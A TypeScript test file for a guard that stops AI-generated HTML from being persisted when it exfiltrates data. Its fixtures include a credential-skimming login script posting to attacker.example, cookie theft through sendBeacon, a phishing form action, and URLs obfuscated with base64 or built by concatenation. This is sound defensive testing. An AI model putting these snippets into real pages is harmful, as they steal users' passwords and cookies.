/**
 * É51 — Tests de la frontière d'écriture du Mutation Orchestrator.
 *
 * Garantie visée : AUCUN contenu dangereux généré par une IA ne peut être
 * PERSISTÉ par le Mutation Orchestrator. La validation (garde-fou
 * d'exfiltration canonique, core) s'exécute dans FileStoreAdapter AVANT tout
 * appel à fileStore — un refus ne persiste RIEN, annule la transaction
 * (rollback automatique), produit une trace d'audit et une erreur honnête.
 *
 * Couverture des cas obligatoires de la mission É51 (§4) :
 * fetch externe, fetch par concaténation, sendBeacon dynamique, form-action
 * interdit, URL encodées/obfusquées, écritures successives, mutations
 * multi-fichiers, contournements de la frontière, écriture légitime.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { FileStore } from '../../../src/file-explorer/store.js';
import { FileStoreAdapter } from '../../../src/ai-native/mutation-orchestrator/filesystem/adapter.js';
import { MutationOrchestratorService } from '../../../src/ai-native/mutation-orchestrator/service.js';
import type { MutationPlan, SingleMutation } from '../../../src/ai-native/mutation-orchestrator/types.js';

const TENANT = 'ten-e51-guard';
const PROJECT = 'proj-e51-guard';

const S8_EXFIL_HTML = `<!DOCTYPE html>
<html lang="fr">
<head><meta charset="utf-8"><title>Connexion</title></head>
<body>
<form id="login">
  <input type="email" name="email">
  <input type="password" name="password">
</form>
<script>
  document.getElementById('login').addEventListener('submit', function (e) {
    e.preventDefault();
    fetch('https://attacker.example/collect', { method: 'POST', body: JSON.stringify({ pwd: document.querySelector('input[type=password]').value }) });
  });
</script>
</body>
</html>`;

const LEGIT_HTML = `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
<img src="https://picsum.photos/seed/e51/600/400" alt="">
<script>fetch('/api/health').then(function (r) { return r.json(); });</script>
</body>
</html>`;

let planCounter = 0;
function makePlan(mutations: readonly SingleMutation[], projectId = PROJECT): MutationPlan {
  planCounter += 1;
  return {
    schemaVersion: '1.0.0',
    planId: `plan-e51-${String(planCounter).padStart(3, '0')}`,
    tenantId: TENANT,
    projectId,
    createdAt: new Date().toISOString(),
    baseGraphHash: 'graph-hash-e51',
    mutations,
    expectedChanges: mutations.map((m) => m.operation.path),
    riskLevel: 'LOW',
    validationStatus: 'VALIDATED',
    planHash: `planhash-e51-${planCounter}`
  };
}

function createMutation(path: string, content: string): SingleMutation {
  return {
    mutationId: `mut-create-${path.replace(/[^a-z0-9]+/gi, '-')}`,
    kind: 'CREATE_FILE',
    target: path,
    preconditions: [],
    operation: { path, content },
    expectedOutcome: `Fichier ${path} créé`,
    evidence: []
  };
}

function updateMutation(path: string, content: string): SingleMutation {
  return {
    mutationId: `mut-update-${path.replace(/[^a-z0-9]+/gi, '-')}`,
    kind: 'UPDATE_FILE',
    target: path,
    preconditions: [],
    operation: { path, content },
    expectedOutcome: `Fichier ${path} mis à jour`,
    evidence: []
  };
}

function newHarness() {
  const fileStore = new FileStore({ persist: false });
  const fileSource = new FileStoreAdapter(fileStore);
  const service = new MutationOrchestratorService(fileSource);
  return { fileStore, fileSource, service };
}

const REFUSAL_MARKER = 'Écriture refusée par le garde-fou';

describe('É51 — frontière d\'écriture du Mutation Orchestrator (refus AVANT persistance)', () => {
  it('CAS 1 — fetch() externe interdit : refus, AUCUNE persistance, contenu inchangé', () => {
    const h = newHarness();
    h.fileSource.updateFile(TENANT, PROJECT, 'index.html', '<!DOCTYPE html><html><body><h1>Original</h1></body></html>');
    assert.throws(
      () => h.fileSource.updateFile(TENANT, PROJECT, 'index.html', S8_EXFIL_HTML),
      (err: Error) => err.message.includes(REFUSAL_MARKER) && err.message.includes('attacker.example')
    );
    const file = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(file, 'le fichier original doit rester intact');
    assert.equal(file.content.includes('Original'), true);
    assert.equal(file.content.includes('attacker.example'), false, 'aucune trace d\'exfiltration écrite');
  });

  it('CAS 1bis — createFile exfiltrant : refus, fichier ABSENT', () => {
    const h = newHarness();
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'index.html', S8_EXFIL_HTML),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    const afterRefusal = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(afterRefusal, 'le fichier semé reste présent');
    assert.equal(afterRefusal.content.includes('Hello VibeCode'), true, 'aucune écriture (contenu semé intact)');
  });

  it('CAS 2 — fetch() avec URL construite par concaténation : refus (destination non identifiable)', () => {
    const h = newHarness();
    const html = `<!DOCTYPE html><html><body><script>
const scheme = 'https://';
const host = 'exfiltrateur';
fetch(scheme + host + '.example/collect', { method: 'POST' });
</script></body></html>`;
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'index.html', html),
      (err: Error) => err.message.includes(REFUSAL_MARKER) && err.message.includes('non-identifiée')
    );
    const afterRefusal = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(afterRefusal);
    assert.equal(afterRefusal.content.includes('Hello VibeCode'), true, 'aucune écriture (contenu semé intact)');
  });

  it('CAS 3 — sendBeacon() destination dynamique : refus', () => {
    const h = newHarness();
    const html = `<!DOCTYPE html><html><body><script>
const dest = ['https://', 'beacon', '.example'].join('');
navigator.sendBeacon(dest, JSON.stringify({ cookie: document.cookie }));
</script></body></html>`;
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'index.html', html),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    const afterRefusal = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(afterRefusal);
    assert.equal(afterRefusal.content.includes('Hello VibeCode'), true, 'aucune écriture (contenu semé intact)');
  });

  it('CAS 4 — form-action vers un domaine interdit : refus', () => {
    const h = newHarness();
    const html = `<!DOCTYPE html><html><body>
<form action="https://phisher.example/signup" method="POST"><input name="email"><input name="password" type="password"></form>
</body></html>`;
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'index.html', html),
      (err: Error) => err.message.includes(REFUSAL_MARKER) && err.message.includes('phisher.example')
    );
    const afterRefusal = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(afterRefusal);
    assert.equal(afterRefusal.content.includes('Hello VibeCode'), true, 'aucune écriture (contenu semé intact)');
  });

  it('CAS 5 — URL obfusquée (atob) et encodée (%-query de tracking) : refus', () => {
    const h = newHarness();
    const obfuscated = `<!DOCTYPE html><html><body><script>
fetch(atob('aHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlL2NvbGxlY3Q='));
</script></body></html>`;
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'index.html', obfuscated),
      (err: Error) => err.message.includes(REFUSAL_MARKER),
      'destination encodée en base64 = non identifiable → refus par défaut'
    );
    const encoded = `<!DOCTYPE html><html><body><img src="https://tracker.example/pixel.gif?u=%2Fhome%2Fsecrets"></body></html>`;
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'page2.html', encoded),
      (err: Error) => err.message.includes(REFUSAL_MARKER),
      'query percent-encodée = tracking → refus'
    );
  });

  it('CAS 6/7 — service executePlan : refus exfiltrant, puis écriture légitime (état intact)', () => {
    const h = newHarness();
    h.fileSource.updateFile(TENANT, PROJECT, 'index.html', '<!DOCTYPE html><html><body><h1>Base</h1></body></html>');
    // Refus au niveau service : throw + rollback automatique
    assert.throws(
      () => h.service.executePlan(makePlan([updateMutation('index.html', S8_EXFIL_HTML)]), undefined, 'ENGINEER', 'req-e51-1'),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    const afterRefusal = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(afterRefusal);
    assert.equal(afterRefusal.content.includes('Base'), true, 'rollback : fichier inchangé après refus');
    // Écriture successive légitime : fonctionne normalement (aucun état empoisonné)
    const result = h.service.executePlan(makePlan([updateMutation('index.html', LEGIT_HTML)]), undefined, 'ENGINEER', 'req-e51-2');
    assert.equal(result.success, true);
    const file = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(file);
    assert.equal(file.content.includes('cdn.tailwindcss.com'), true);
    assert.equal(file.content.includes('fonts.googleapis.com'), true);
  });

  it('CAS 7bis — mutation multi-fichiers (bénin + exfiltrant) : transaction refusée, AUCUN fichier modifié', () => {
    const h = newHarness();
    h.fileSource.updateFile(TENANT, PROJECT, 'index.html', '<!DOCTYPE html><html><body><h1>V0</h1></body></html>');
    const component = 'export function Button() { return "/api/save"; }\n';
    assert.throws(
      () => h.service.executePlan(
        makePlan([createMutation('src/components/Button.tsx', component), updateMutation('index.html', S8_EXFIL_HTML)]),
        undefined,
        'ENGINEER',
        'req-e51-3'
      ),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    const html = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(html);
    assert.equal(html.content.includes('V0'), true, 'rollback du fichier déjà muté dans le batch');
    assert.equal(h.fileStore.getFile(TENANT, PROJECT, 'src/components/Button.tsx'), null, 'le composant du batch refusé n\'existe pas');
  });

  it('CAS 9 — contournements de la frontière : UPDATE_SYMBOL exfiltrant, casse mixte, extension déguisée', () => {
    const h = newHarness();
    // UPDATE_SYMBOL avec remplacement exfiltrant sur index.html
    h.fileSource.updateFile(TENANT, PROJECT, 'index.html', '<!DOCTYPE html><html><body><h1>Hero</h1></body></html>');
    assert.throws(
      () => h.service.executePlan(
        makePlan([{
          mutationId: 'mut-symbol-1',
          kind: 'UPDATE_SYMBOL',
          target: 'index.html',
          preconditions: [],
          operation: {
            path: 'index.html',
            symbolName: '<h1>Hero</h1>',
            replacement: '<script>fetch("https://attacker.example/s", { method: "POST" })</script>'
          },
          expectedOutcome: 'Hero remplacé',
          evidence: []
        }]),
        undefined,
        'ENGINEER',
        'req-e51-4'
      ),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    const after = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(after);
    assert.equal(after.content.includes('Hero'), true, 'contenu inchangé après refus UPDATE_SYMBOL');

    // Casse mixte du chemin (INDEX.HTML)
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'INDEX.HTML', S8_EXFIL_HTML),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    // Extension déguisée avec enveloppe HTML (page.html.bak)
    assert.throws(
      () => h.fileSource.createFile(TENANT, PROJECT, 'page.html.bak', S8_EXFIL_HTML),
      (err: Error) => err.message.includes(REFUSAL_MARKER)
    );
    assert.equal(h.fileStore.getFile(TENANT, PROJECT, 'INDEX.HTML'), null);
    assert.equal(h.fileStore.getFile(TENANT, PROJECT, 'page.html.bak'), null);
  });

  it('CAS 10 — écriture légitime : Tailwind CDN + Google Fonts + picsum + fetch relatif → PERSISTÉE', () => {
    const h = newHarness();
    // NB : index.html est semé par le FileStore dans tout projet vierge
    // (comportement produit préexistant) → la création légitime est prouvée
    // sur une nouvelle page, la mise à jour légitime sur la page semée.
    const created = h.service.executePlan(makePlan([createMutation('about.html', LEGIT_HTML)]), undefined, 'ENGINEER', 'req-e51-5');
    assert.equal(created.success, true);
    assert.equal(created.transaction.status, 'COMMITTED');
    const about = h.fileStore.getFile(TENANT, PROJECT, 'about.html');
    assert.ok(about);
    assert.equal(about.content.includes('cdn.tailwindcss.com'), true);
    const result = h.service.executePlan(makePlan([updateMutation('index.html', LEGIT_HTML)]), undefined, 'ENGINEER', 'req-e51-5b');
    assert.equal(result.success, true);
    assert.equal(result.transaction.status, 'COMMITTED');
    const file = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(file);
    assert.equal(file.content.includes('cdn.tailwindcss.com'), true);
    assert.equal(file.content.includes('fonts.googleapis.com'), true);
    assert.equal(file.content.includes("fetch('/api/health')"), true);
  });

  it('CAS 10bis — écritures non-HTML préservées (composants, JSON avec URLs légitimes)', () => {
    const h = newHarness();
    const component = 'export const API_DOC = "https://developer.mozilla.org/docs/Web/API";\n';
    const result = h.service.executePlan(
      makePlan([createMutation('src/components/Doc.tsx', component), createMutation('package.json', '{\n  "name": "app",\n  "repository": "https://github.com/example/repo"\n}\n')]),
      undefined,
      'ENGINEER',
      'req-e51-6'
    );
    assert.equal(result.success, true, 'les écritures non-HTML (non exécutables dans l\'artefact servi) restent légitimes');
    assert.ok(h.fileStore.getFile(TENANT, PROJECT, 'src/components/Doc.tsx'));
    assert.ok(h.fileStore.getFile(TENANT, PROJECT, 'package.json'));
  });

  it('CAS 8 — mécanisme de rollback : inchangé et fonctionnel avec le guard en place', () => {
    const h = newHarness();
    h.fileSource.updateFile(TENANT, PROJECT, 'index.html', '<!DOCTYPE html><html><body><h1>V1</h1></body></html>');
    const result = h.service.executePlan(makePlan([updateMutation('index.html', LEGIT_HTML)]), undefined, 'ENGINEER', 'req-e51-7');
    assert.equal(result.success, true);
    const rollback = h.service.rollback(result.transaction.transactionId, 'ENGINEER', 'req-e51-8');
    assert.equal(rollback.success, true, 'rollback explicite fonctionnel');
    const file = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(file);
    assert.equal(file.content.includes('V1'), true, 'contenu d\'origine restauré');
  });

  it('CAS 6-ter — dry-run d\'un contenu exfiltrant : aucune persistance possible', () => {
    const h = newHarness();
    // NB : index.html est SEMÉ par le FileStore dans tout projet vierge
    // (comportement produit préexistant) → le dry-run s'applique à UPDATE_FILE.
    const result = h.service.executePlan(makePlan([updateMutation('index.html', S8_EXFIL_HTML)]), { dryRun: true }, 'ENGINEER', 'req-e51-9');
    assert.equal(result.dryRun, true);
    const file = h.fileStore.getFile(TENANT, PROJECT, 'index.html');
    assert.ok(file);
    assert.equal(file.content.includes('Hello VibeCode'), true, 'un dry-run n\'écrit jamais (contenu semé intact)');
    assert.equal(file.content.includes('attacker.example'), false, 'aucune trace d\'exfiltration persistée');
  });
});
